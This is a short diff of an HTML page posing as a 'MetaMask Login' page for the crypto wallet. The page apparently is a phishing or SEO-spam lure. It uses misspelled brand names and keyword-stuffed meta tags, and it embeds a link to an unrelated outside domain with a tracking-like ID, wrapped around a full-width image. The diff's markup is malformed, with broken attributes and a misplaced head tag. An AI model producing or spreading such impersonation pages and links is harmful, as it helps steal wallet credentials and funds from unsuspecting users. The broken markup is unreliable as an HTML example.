@@ -1,10 +1,10 @@
 <html>
-<head>
 <title>MetaMAsk Login</title>
-<meta name="MetáMask login is understandable for everyone, from beginners to experts, because it has the simplest and quickest interface, making it user-friendly." content="">
+<head>
+<meta name="MetáMask login is understandable for everyone, from beginners to experts, because it has the simplest and quickest interface, making it user-friendly." content">
 <meta name="metamask login" content="<a href="https://surphyeaskets.com/702501e5-f37e-4be0-a036-914d7cecb4d2
 "><p class="text-center" mt-4=""><img style="display: block; margin-left: auto;margin-right: auto;" src="https://miro.medium.com/max/2400/1*eLq7IBKW-FPSVt5i2aVPUw.png" alt="/" width="100%" height="auto"></p></a>
-">
+
 </head>
 <body>
 <h2>MetaMask Login&nbsp;- The Crypto Wallet for Defi, Web3 Dapps and NFTs</h2>
